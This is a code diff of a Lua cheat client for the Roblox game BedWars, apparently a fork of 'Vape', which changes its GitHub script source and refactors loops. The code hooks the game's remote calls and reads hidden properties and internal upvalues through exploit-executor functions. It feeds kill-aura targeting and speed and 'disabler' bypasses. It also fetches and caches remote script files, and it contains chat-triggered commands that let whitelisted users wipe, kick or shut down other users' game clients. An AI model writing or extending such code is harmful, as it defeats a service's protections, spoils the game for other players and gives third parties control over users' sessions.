@@ -1,3 +1,4 @@
+--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -14,34 +15,12 @@ local vapeConnections = {}
 local vapeCachedAssets = {}
 local vapeEvents = setmetatable({}, {
 	__index = function(self, index)
-		local result = rawget(self, index)
-		if result == nil then
-			result = Instance.new("BindableEvent")
-			rawset(self, index, result)
-		end
-		return result
+		self[index] = Instance.new("BindableEvent")
+		return self[index]
 	end
 })
 local vapeTargetInfo = shared.VapeTargetInfo
-
-local blankFunction = function(...) return ... end
-
-local MessageHandler = {publish = blankFunction}
-local _VapeApi = {
-	vapeInjected = true,
-	killauraNearPlayer = nil,
-	holdingshift = nil,
-	spiderActive = nil,
-	antivoidvelo = nil
-}
-
-
-local ReducePackets = {["Enabled"] = false} -- modification
-local ReduceKillAura = {["Enabled"] = false}
-local ReduceAutoBuy = {["Enabled"] = false}
-local ReduceAutoBank = {["Enabled"] = false}
-local ReduceChestStealer = {["Enabled"] = false}
-local ReduceDisabler = {["Enabled"] = false}
+local vapeInjected = true
 
 local bedwars = {}
 local bedwarsStore = {
@@ -55,8 +34,6 @@ local bedwarsStore = {
 	forgeMasteryPoints = 0,
 	forgeUpgrades = {},
 	grapple = tick(),
-	disabler = tick(), -- small implementation for custom disablers
-	disablerSpeed = 20,
 	inventories = {},
 	localInventory = {
 		inventory = {
@@ -80,7 +57,7 @@ local bedwarsStore = {
 		universalLagbacks = 0
 	},
 	whitelist = {
-		chatStrings1 = {helloimusinginhaler = "vape", ["###################"] = "vape"}, -- modification
+		chatStrings1 = {helloimusinginhaler = "vape"},
 		chatStrings2 = {vape = "helloimusinginhaler"},
 		clientUsers = {},
 		oldChatFunctions = {}
@@ -97,19 +74,17 @@ local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
 	return suc and res ~= nil
 end
-
 local networkownerswitch = tick()
-
 local isnetworkowner = isnetworkowner or function(part)
 	local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
 	if suc and res == Enum.NetworkOwnership.Manual then 
 		sethiddenproperty(part, "NetworkOwnershipRule", Enum.NetworkOwnership.Automatic)
 		networkownerswitch = tick() + 8
 	end
-	return Fluxus ~= nil or networkownerswitch <= tick()
+	return networkownerswitch <= tick()
 end
 local getcustomasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
-local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or blankFunction
+local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
 local synapsev3 = syn and syn.toast_notification and "V3" or ""
 local worldtoscreenpoint = function(pos)
 	if synapsev3 == "V3" then 
@@ -128,7 +103,7 @@ end
 
 local function vapeGithubRequest(scripturl)
 	if not isfile("vape/"..scripturl) then
-		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
+		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/asfsnfskjsfjdgkjgfhfjhfjhfsjhjfjfhDadPGN/GalaxywareV1ForRoblox/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
 		assert(suc, res)
 		assert(res ~= "404: Not Found", res)
 		if scripturl:find(".lua") then res = "--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.\n"..res end
@@ -307,15 +282,15 @@ do
 end
 
 GuiLibrary.SelfDestructEvent.Event:Connect(function()
-	_VapeApi.vapeInjected = false
-	for i, v in next, (vapeConnections) do
+	vapeInjected = false
+	for i, v in pairs(vapeConnections) do
 		if v.Disconnect then pcall(function() v:Disconnect() end) continue end
 		if v.disconnect then pcall(function() v:disconnect() end) continue end
 	end
 end)
 
 local function getItem(itemName, inv)
-	for slot, item in next, (inv or bedwarsStore.localInventory.inventory.items) do
+	for slot, item in pairs(inv or bedwarsStore.localInventory.inventory.items) do
 		if item.itemType == itemName then
 			return item, slot
 		end
@@ -324,7 +299,7 @@ local function getItem(itemName, inv)
 end
 
 local function getItemNear(itemName, inv)
-	for slot, item in next, (inv or bedwarsStore.localInventory.inventory.items) do
+	for slot, item in pairs(inv or bedwarsStore.localInventory.inventory.items) do
 		if item.itemType == itemName or item.itemType:find(itemName) then
 			return item, slot
 		end
@@ -333,7 +308,7 @@ local function getItemNear(itemName, inv)
 end
 
 local function getHotbarSlot(itemName)
-	for slotNumber, slotTable in next, (bedwarsStore.localInventory.hotbar) do
+	for slotNumber, slotTable in pairs(bedwarsStore.localInventory.hotbar) do
 		if slotTable.item and slotTable.item.itemType == itemName then
 			return slotNumber - 1
 		end
@@ -343,9 +318,9 @@ end
 
 local function getShieldAttribute(char)
 	local returnedShield = 0
-	for attributeName, attributeValue in next, (char:GetAttributes()) do 
+	for attributeName, attributeValue in pairs(char:GetAttributes()) do 
 		if attributeName:find("Shield") and type(attributeValue) == "number" then 
-			returnedShield += attributeValue
+			returnedShield = returnedShield + attributeValue
 		end
 	end
 	return returnedShield
@@ -357,7 +332,7 @@ end
 
 local function getAxe()
 	local bestAxe, bestAxeSlot = nil, nil
-	for slot, item in next, (bedwarsStore.localInventory.inventory.items) do
+	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
 		if item.itemType:find("axe") and item.itemType:find("pickaxe") == nil and item.itemType:find("void") == nil then
 			bextAxe, bextAxeSlot = item, slot
 		end
@@ -365,10 +340,9 @@ local function getAxe()
 	return bestAxe, bestAxeSlot
 end
 
-local bestSword, bestSwordSlot, bestSwordDamage = nil, nil, 0
-table.insert(vapeConnections, vapeEvents.InventoryChanged.Event:Connect(function()
-	bestSword, bestSwordSlot, bestSwordDamage = nil, nil, 0
-	for slot, item in next, (bedwarsStore.localInventory.inventory.items) do
+local function getSword()
+	local bestSword, bestSwordSlot, bestSwordDamage = nil, nil, 0
+	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
 		local swordMeta = bedwars.ItemTable[item.itemType].sword
 		if swordMeta then
 			local swordDamage = swordMeta.damage or 0
@@ -377,16 +351,12 @@ table.insert(vapeConnections, vapeEvents.InventoryChanged.Event:Connect(function
 			end
 		end
 	end
-end))
-
-
-local function getSword()
 	return bestSword, bestSwordSlot
 end
 
 local function getBow()
 	local bestBow, bestBowSlot, bestBowStrength = nil, nil, 0
-	for slot, item in next, (bedwarsStore.localInventory.inventory.items) do
+	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
 		if item.itemType:find("bow") then 
 			local tab = bedwars.ItemTable[item.itemType].projectileSource
 			local ammo = tab.projectileType("arrow")	
@@ -405,7 +375,7 @@ local function getWool()
 end
 
 local function getBlock()
-	for slot, item in next, (bedwarsStore.localInventory.inventory.items) do
+	for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
 		if bedwars.ItemTable[item.itemType].block then
 			return item.itemType, item.amount
 		end
@@ -429,9 +399,6 @@ local function getSpeed()
 		if bedwarsStore.scythe > tick() then 
 			speed = speed + 5
 		end
-		if bedwarsStore.disabler > tick() then 
-			speed = speed + bedwarsStore.disablerSpeed
-		end
 		if lplr.Character:GetAttribute("GrimReaperChannel") then 
 			speed = speed + 20
 		end
@@ -453,7 +420,7 @@ local blacklistedblocks = {
 	ceramic = true
 }
 local cachedNormalSides = {}
-for i,v in next, (Enum.NormalId:GetEnumItems()) do if v.Name ~= "Bottom" then table.insert(cachedNormalSides, v) end end
+for i,v in pairs(Enum.NormalId:GetEnumItems()) do if v.Name ~= "Bottom" then table.insert(cachedNormalSides, v) end end
 local updateitem = Instance.new("BindableEvent")
 local inputobj = nil
 local tempconnection
@@ -496,7 +463,7 @@ local function getBestTool(block)
 	local blockType = blockmeta.block and blockmeta.block.breakType
 	if blockType then
 		local best = 0
-		for i,v in next, (bedwarsStore.localInventory.inventory.items) do
+		for i,v in pairs(bedwarsStore.localInventory.inventory.items) do
 			local meta = bedwars.ItemTable[v.itemType]
 			if meta.breakBlock and meta.breakBlock[blockType] and meta.breakBlock[blockType] >= best then
 				best = meta.breakBlock[blockType]
@@ -509,7 +476,7 @@ end
 
 local function getOpenApps()
 	local count = 0
-	for i,v in next, (bedwars.AppController:getOpenApps()) do if (not tostring(v):find("Billboard")) and (not tostring(v):find("GameNametag")) then count = count + 1 end end
+	for i,v in pairs(bedwars.AppController:getOpenApps()) do if (not tostring(v):find("Billboard")) and (not tostring(v):find("GameNametag")) then count = count + 1 end end
 	return count
 end
 
@@ -545,7 +512,7 @@ end
 
 local function isBlockCovered(pos)
 	local coveredsides = 0
-	for i, v in next, (cachedNormalSides) do
+	for i, v in pairs(cachedNormalSides) do
 		local blockpos = (pos + (Vector3.FromNormalId(v) * 3))
 		local block = getPlacedBlock(blockpos)
 		if block then
@@ -597,9 +564,9 @@ end
 
 local function getBestBreakSide(pos)
 	local softest, softestside = 9e9, Enum.NormalId.Top
-	for i,v in next, (cachedNormalSides) do
+	for i,v in pairs(cachedNormalSides) do
 		local sidehardness = 0
-		for i2,v2 in next, (GetPlacedBlocksNear(pos, v)) do	
+		for i2,v2 in pairs(GetPlacedBlocksNear(pos, v)) do	
 			local blockmeta = bedwars.ItemTable[v2].block
 			sidehardness = sidehardness + (blockmeta and blockmeta.health or 10)
             if blockmeta then
@@ -620,7 +587,7 @@ end
 local function EntityNearPosition(distance, ignore, overridepos)
 	local closestEntity, closestMagnitude = nil, distance
 	if entityLibrary.isAlive then
-		for i, v in next, (entityLibrary.entityList) do
+		for i, v in pairs(entityLibrary.entityList) do
 			if not v.Targetable then continue end
             if isVulnerable(v) then
 				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.RootPart.Position).magnitude
@@ -633,7 +600,7 @@ local function EntityNearPosition(distance, ignore, overridepos)
             end
         end
 		if not ignore then
-			for i, v in next, (collectionService:GetTagged("Monster")) do
+			for i, v in pairs(collectionService:GetTagged("Monster")) do
 				if v.PrimaryPart and v:GetAttribute("Team") ~= lplr:GetAttribute("Team") then
 					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
 					if overridepos and mag > distance then 
@@ -644,7 +611,7 @@ local function EntityNearPosition(distance, ignore, overridepos)
 					end
 				end
 			end
-			for i, v in next, (collectionService:GetTagged("DiamondGuardian")) do
+			for i, v in pairs(collectionService:GetTagged("DiamondGuardian")) do
 				if v.PrimaryPart then
 					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
 					if overridepos and mag > distance then 
@@ -655,7 +622,7 @@ local function EntityNearPosition(distance, ignore, overridepos)
 					end
 				end
 			end
-			for i, v in next, (collectionService:GetTagged("GolemBoss")) do
+			for i, v in pairs(collectionService:GetTagged("GolemBoss")) do
 				if v.PrimaryPart then
 					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
 					if overridepos and mag > distance then 
@@ -666,7 +633,7 @@ local function EntityNearPosition(distance, ignore, overridepos)
 					end
 				end
 			end
-			for i, v in next, (collectionService:GetTagged("Drone")) do
+			for i, v in pairs(collectionService:GetTagged("Drone")) do
 				if v.PrimaryPart and tonumber(v:GetAttribute("PlayerUserId")) ~= lplr.UserId then
 					local droneplr = playersService:GetPlayerByUserId(v:GetAttribute("PlayerUserId"))
 					if droneplr and droneplr.Team == lplr.Team then continue end
@@ -688,7 +655,7 @@ local function EntityNearMouse(distance)
 	local closestEntity, closestMagnitude = nil, distance
     if entityLibrary.isAlive then
 		local mousepos = inputService.GetMouseLocation(inputService)
-		for i, v in next, (entityLibrary.entityList) do
+		for i, v in pairs(entityLibrary.entityList) do
 			if not v.Targetable then continue end
             if isVulnerable(v) then
 				local vec, vis = worldtoscreenpoint(v.RootPart.Position)
@@ -702,12 +669,12 @@ local function EntityNearMouse(distance)
 	return closestEntity
 end
 
-local function AllNearPosition(distance, amount, sortfunction, prediction, overridepos, ignore) -- modification
+local function AllNearPosition(distance, amount, sortfunction, prediction)
 	local returnedplayer = {}
 	local currentamount = 0
     if entityLibrary.isAlive then
 		local sortedentities = {}
-		for i, v in next, (entityLibrary.entityList) do
+		for i, v in pairs(entityLibrary.entityList) do
 			if not v.Targetable then continue end
             if isVulnerable(v) then
 				local playerPosition = v.RootPart.Position
@@ -715,77 +682,74 @@ local function AllNearPosition(distance, amount, sortfunction, prediction, overr
 				if prediction and mag > distance then
 					mag = (entityLibrary.LocalPosition - playerPosition).magnitude
 				end
-				if overridepos then mag = (overridepos - playerPosition).magnitude end -- modification
                 if mag <= distance then
 					table.insert(sortedentities, v)
                 end
             end
         end
-		if not ignore then
-			for i, v in next, (collectionService:GetTagged("Monster")) do
-				if v.PrimaryPart then
-					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
-					if prediction and mag > distance then
-						mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
-					end
-					if mag <= distance then
-						if v:GetAttribute("Team") == lplr:GetAttribute("Team") then continue end
-						table.insert(sortedentities, {Player = {Name = v.Name, UserId = (v.Name == "Duck" and 2020831224 or 1443379645), GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
-					end
+		for i, v in pairs(collectionService:GetTagged("Monster")) do
+			if v.PrimaryPart then
+				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
+				if prediction and mag > distance then
+					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
 				end
+                if mag <= distance then
+					if v:GetAttribute("Team") == lplr:GetAttribute("Team") then continue end
+                    table.insert(sortedentities, {Player = {Name = v.Name, UserId = (v.Name == "Duck" and 2020831224 or 1443379645), GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
+                end
 			end
-			for i, v in next, (collectionService:GetTagged("DiamondGuardian")) do
-				if v.PrimaryPart then
-					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
-					if prediction and mag > distance then
-						mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
-					end
-					if mag <= distance then
-						table.insert(sortedentities, {Player = {Name = "DiamondGuardian", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
-					end
+		end
+		for i, v in pairs(collectionService:GetTagged("DiamondGuardian")) do
+			if v.PrimaryPart then
+				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
+				if prediction and mag > distance then
+					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
 				end
+                if mag <= distance then
+                    table.insert(sortedentities, {Player = {Name = "DiamondGuardian", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
+                end
 			end
-			for i, v in next, (collectionService:GetTagged("GolemBoss")) do
-				if v.PrimaryPart then
-					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
-					if prediction and mag > distance then
-						mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
-					end
-					if mag <= distance then
-						table.insert(sortedentities, {Player = {Name = "GolemBoss", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
-					end
+		end
+		for i, v in pairs(collectionService:GetTagged("GolemBoss")) do
+			if v.PrimaryPart then
+				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
+				if prediction and mag > distance then
+					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
 				end
+                if mag <= distance then
+                    table.insert(sortedentities, {Player = {Name = "GolemBoss", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
+                end
 			end
-			for i, v in next, (collectionService:GetTagged("Drone")) do
-				if v.PrimaryPart then
-					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
-					if prediction and mag > distance then
-						mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
-					end
-					if mag <= distance then
-						if tonumber(v:GetAttribute("PlayerUserId")) == lplr.UserId then continue end
-						local droneplr = playersService:GetPlayerByUserId(v:GetAttribute("PlayerUserId"))
-						if droneplr and droneplr.Team == lplr.Team then continue end
-						table.insert(sortedentities, {Player = {Name = "Drone", UserId = 1443379645}, GetAttribute = function() return "none" end, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
-					end
+		end
+		for i, v in pairs(collectionService:GetTagged("Drone")) do
+			if v.PrimaryPart then
+				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
+				if prediction and mag > distance then
+					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
 				end
+                if mag <= distance then
+					if tonumber(v:GetAttribute("PlayerUserId")) == lplr.UserId then continue end
+					local droneplr = playersService:GetPlayerByUserId(v:GetAttribute("PlayerUserId"))
+					if droneplr and droneplr.Team == lplr.Team then continue end
+                    table.insert(sortedentities, {Player = {Name = "Drone", UserId = 1443379645}, GetAttribute = function() return "none" end, Character = v, RootPart = v.PrimaryPart, Humanoid = v.Humanoid})
+                end
 			end
-			for i, v in next, (bedwarsStore.pots) do
-				if v.PrimaryPart then
-					local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
-					if prediction and mag > distance then
-						mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
-					end
-					if mag <= distance then
-						table.insert(sortedentities, {Player = {Name = "Pot", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = {Health = 100, MaxHealth = 100}})
-					end
+		end
+		for i, v in pairs(bedwarsStore.pots) do
+			if v.PrimaryPart then
+				local mag = (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude
+				if prediction and mag > distance then
+					mag = (entityLibrary.LocalPosition - v.PrimaryPart.Position).magnitude
 				end
+                if mag <= distance then
+                    table.insert(sortedentities, {Player = {Name = "Pot", UserId = 1443379645, GetAttribute = function() return "none" end}, Character = v, RootPart = v.PrimaryPart, Humanoid = {Health = 100, MaxHealth = 100}})
+                end
 			end
 		end
 		if sortfunction then
 			table.sort(sortedentities, sortfunction)
 		end
-		for i,v in next, (sortedentities) do 
+		for i,v in pairs(sortedentities) do 
 			table.insert(returnedplayer, v)
 			currentamount = currentamount + 1
 			if currentamount >= amount then break end
@@ -814,7 +778,7 @@ local function CreateAutoHotbarGUI(children2, argstable)
 	}
 	local items = bedwars.ItemTable
 	if items then
-		for i2,v2 in next, (items) do
+		for i2,v2 in pairs(items) do
 			if (i2:find("axe") == nil or i2:find("void")) and i2:find("bow") == nil and i2:find("shears") == nil and i2:find("wool") == nil and v2.sword == nil and v2.armor == nil and v2["dontGiveItem"] == nil and bedwars.ItemTable[i2] and bedwars.ItemTable[i2].image then
 				table.insert(sortableitems, {itemType = i2, itemDisplayType = i2})
 			end
@@ -987,17 +951,17 @@ local function CreateAutoHotbarGUI(children2, argstable)
 	refreshslots = function()
 		local startnum = 144
 		local oldhovered = hoveredslot
-		for i2,v2 in next, (ItemListFrame:GetChildren()) do
+		for i2,v2 in pairs(ItemListFrame:GetChildren()) do
 			if v2.Name:find("ItemSlot") then
 				v2:Remove()
 			end
 		end
-		for i3,v3 in next, (ItemListFramePicker:GetChildren()) do
+		for i3,v3 in pairs(ItemListFramePicker:GetChildren()) do
 			if v3:IsA("TextButton") then
 				v3:Remove()
 			end
 		end
-		for i4,v4 in next, (sortableitems) do
+		for i4,v4 in pairs(sortableitems) do
 			local ItemFrame = Instance.new("TextButton")
 			ItemFrame.Text = ""
 			ItemFrame.BackgroundColor3 = Color3.fromRGB(31, 30, 31)
@@ -1014,7 +978,7 @@ local function CreateAutoHotbarGUI(children2, argstable)
 			ItemFramecorner.CornerRadius = UDim.new(0, 5)
 			ItemFramecorner.Parent = ItemFrame
 			ItemFrame.MouseButton1Click:Connect(function()
-				for i5,v5 in next, (buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"]) do
+				for i5,v5 in pairs(buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"]) do
 					if v5.itemType == v4.itemType then
 						buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"][tostring(i5)] = nil
 					end
@@ -1130,17 +1094,17 @@ local function CreateAutoHotbarGUI(children2, argstable)
 	refreshList = function()
 		local newnum = 0
 		local newtab = {}
-		for i3,v3 in next, (buttonapi["Hotbars"]) do
+		for i3,v3 in pairs(buttonapi["Hotbars"]) do
 			newnum = newnum + 1
 			newtab[newnum] = v3
 		end
 		buttonapi["Hotbars"] = newtab
-		for i,v in next, (children3:GetChildren()) do
+		for i,v in pairs(children3:GetChildren()) do
 			if v:IsA("TextButton") then
 				v:Remove()
 			end
 		end
-		for i2,v2 in next, (buttonapi["Hotbars"]) do
+		for i2,v2 in pairs(buttonapi["Hotbars"]) do
 			createHotbarButton(i2, v2["Items"])
 		end
 		GuiLibrary["Settings"][children2.Name..argstable["Name"].."ItemList"] = {["Type"] = "ItemList", ["Items"] = buttonapi["Hotbars"], ["CurrentlySelected"] = buttonapi["CurrentlySelected"]}
@@ -1158,7 +1122,7 @@ local function CreateAutoHotbarGUI(children2, argstable)
 end
 
 GuiLibrary.LoadSettingsEvent.Event:Connect(function(res)
-	for i,v in next, (res) do
+	for i,v in pairs(res) do
 		local obj = GuiLibrary.ObjectsThatCanBeSaved[i]
 		if obj and v.Type == "ItemList" and obj.Api then
 			obj.Api.Hotbars = v.Items
@@ -1171,7 +1135,7 @@ end)
 runFunction(function()
 	local function getWhitelistedBed(bed)
 		if bed then
-			for i,v in next, (playersService:GetPlayers()) do
+			for i,v in pairs(playersService:GetPlayers()) do
 				if v:GetAttribute("Team") and bed and bed:GetAttribute("Team"..(v:GetAttribute("Team") or 0).."NoBreak") then
 					local plrtype, plrattackable = WhitelistFunctions:GetWhitelist(v)
 					if not plrattackable then 
@@ -1184,7 +1148,7 @@ runFunction(function()
 	end
 
 	local function dumpRemote(tab)
-		for i,v in next, (tab) do
+		for i,v in pairs(tab) do
 			if v == "Client" then
 				return tab[i + 1]
 			end
@@ -1207,7 +1171,7 @@ runFunction(function()
 	local oldRemoteGet = getmetatable(Client).Get
 
 	getmetatable(Client).Get = function(self, remoteName)
-		if not _VapeApi.vapeInjected then return oldRemoteGet(self, remoteName) end
+		if not vapeInjected then return oldRemoteGet(self, remoteName) end
 		local originalRemote = oldRemoteGet(self, remoteName)
 		if remoteName == "DamageBlock" then
 			return {
@@ -1357,13 +1321,12 @@ runFunction(function()
 		RavenTable = KnitClient.Controllers.RavenController,
 		RelicController = KnitClient.Controllers.RelicVotingController,
 		ReportRemote = dumpRemote(debug.getconstants(require(lplr.PlayerScripts.TS.controllers.global.report["report-controller"]).default.reportPlayer)),
-		ResetController = KnitClient.Controllers.ResetController, -- modification
 		ResetRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.ResetController.createBindable, 1))),
 		Roact = require(replicatedStorageService["rbxts_include"]["node_modules"]["@rbxts"]["roact"].src),
 		RuntimeLib = require(replicatedStorageService["rbxts_include"].RuntimeLib),
 		ScytheController = KnitClient.Controllers.ScytheController,
 		Shop = require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop,
-		ShopItems = debug.getupvalue(debug.getupvalue(require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 1), 2),
+		ShopItems = debug.getupvalue(debug.getupvalue(require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 1), 3),
 		SoundList = require(replicatedStorageService.TS.sound["game-sound"]).GameSound,
 		SoundManager = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out).SoundManager,
 		SpawnRavenRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.RavenController.spawnRaven)),
@@ -1390,39 +1353,6 @@ runFunction(function()
 		blockHealth = -1,
 		breakingBlockPosition = Vector3.zero
 	}
-	
-	bedwars.TweenDefault = require(replicatedStorageService.rbxts_include.node_modules["@rbxts"].tween).default -- modification
-	bedwars.EasingFunctions = require(replicatedStorageService.rbxts_include.node_modules["@rbxts"]["easing-functions"])
-	bedwars.theme = require(replicatedStorageService.TS.theme.theme).Theme
-	bedwars.ColorUtil = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out).ColorUtil
-	bedwars.healthBarShieldColor = require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["shield"]).HEALTHBAR_SHIELD_COLOR
-	bedwars.make = function(class, properties)
-		local children = properties.Children
-		local _instance = Instance.new(class)
-		for key, value in pairs(properties) do
-			if key ~= "Children" and key ~= "Parent" then
-				local _signal = _instance[key]
-				if typeof(_signal) == "RBXScriptSignal" then
-					_signal:Connect(value)
-				else
-					_instance[key] = value
-				end
-			end
-		end
-		if children then
-			local key, value, _next = ipairs(children)
-			while true do
-				key(value, _next)
-				if not key then
-					break
-				end
-				_next = key
-				v7.Parent = _instance		
-			end
-		end
-		_instance.Parent = properties.Parent
-		return _instance
-	end
 
 	local failedBreak = 0
 	bedwars.breakBlock = function(pos, effects, normal, bypass, anim)
@@ -1442,7 +1372,7 @@ runFunction(function()
 			local blockhealthbarpos = {blockPosition = Vector3.zero}
 			local blockdmg = 0
 			if block and block.Parent ~= nil then
-				if ((shared.pingbypassroot and shared.pingbypassroot.Position or entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - (blockpos * 3)).magnitude > 30 then return end
+				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - (blockpos * 3)).magnitude > 30 then return end
 				bedwarsStore.blockPlace = tick() + 0.1
 				switchToAndUseTool(block)
 				blockhealthbarpos = {
@@ -1530,14 +1460,14 @@ runFunction(function()
 	table.insert(vapeConnections, bedwars.ClientStoreHandler.changed:connect(updateStore))
 	updateStore(bedwars.ClientStoreHandler:getState(), {})
 
-	for i, v in next, ({"MatchEndEvent", "EntityDeathEvent", "EntityDamageEvent", "BedwarsBedBreak", "BalloonPopped", "AngelProgress", "StatefulEntityPlayerKnockbackRequest", "ScytheApplyState"}) do -- modification 
+	for i, v in pairs({"MatchEndEvent", "EntityDeathEvent", "EntityDamageEvent", "BedwarsBedBreak", "BalloonPopped", "AngelProgress"}) do 
 		bedwars.ClientHandler:WaitFor(v):andThen(function(connection)
 			table.insert(vapeConnections, connection:Connect(function(...)
 				vapeEvents[v]:Fire(...)
 			end))
 		end)
 	end
-	for i, v in next, ({"PlaceBlockEvent", "BreakBlockEvent"}) do 
+	for i, v in pairs({"PlaceBlockEvent", "BreakBlockEvent"}) do 
 		bedwars.ClientHandlerDamageBlock:WaitFor(v):andThen(function(connection)
 			table.insert(vapeConnections, connection:Connect(function(...)
 				vapeEvents[v]:Fire(...)
@@ -1558,7 +1488,7 @@ runFunction(function()
 			bedwarsStore.blockRaycast.FilterDescendantsInstances = {bedwarsStore.blocks}
 		end
 	end))
-	for _, ent in next, (collectionService:GetTagged("entity")) do 
+	for _, ent in pairs(collectionService:GetTagged("entity")) do 
 		if ent.Name == "DesertPotEntity" then 
 			table.insert(bedwarsStore.pots, ent)
 		end
@@ -1583,9 +1513,9 @@ runFunction(function()
 
 	task.spawn(function()
 		repeat task.wait() until WhitelistFunctions.Loaded
-		for i, v in next, (WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
+		for i, v in pairs(WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
 			if v.tags then
-				for i2, v2 in next, (v.tags) do
+				for i2, v2 in pairs(v.tags) do
 					v2.color = Color3.fromRGB(unpack(v2.color))
 				end
 			end
@@ -1600,7 +1530,7 @@ runFunction(function()
 			if arg == "default" and continuechecking and WhitelistFunctions.LocalPriority == 0 then table.insert(temp, lplr) continuechecking = false end
 			if arg == "teamdefault" and continuechecking and WhitelistFunctions.LocalPriority == 0 and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
 			if arg == "private" and continuechecking and WhitelistFunctions.LocalPriority == 1 then table.insert(temp, lplr) continuechecking = false end
-			for i,v in next, (playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+			for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
 
 			return temp
 		end
@@ -1653,7 +1583,7 @@ runFunction(function()
 				end
 			end
 		
-			for i,v in next, (game:GetDescendants()) do
+			for i,v in pairs(game:GetDescendants()) do
 				funnyfunc(v)
 			end
 			game.DescendantAdded:Connect(funnyfunc)
@@ -1685,7 +1615,7 @@ runFunction(function()
 					lplr.PlayerGui:ClearAllChildren()
 					GuiLibrary.MainGui.Enabled = false
 					game:GetService("CoreGui"):ClearAllChildren()
-					for i,v in next, (workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
 					task.wait(0.2)
 					lplr:Kick()
 					game:GetService("GuiService"):ClearError()
@@ -1702,9 +1632,6 @@ runFunction(function()
 						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 					end)
 					task.delay(2, function()
-						local function shutTheFuckUp() -- modification
-							game.Shutdown(game)
-						end
 						local e = Roact.createElement(auth, {
 							style = {},
 							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
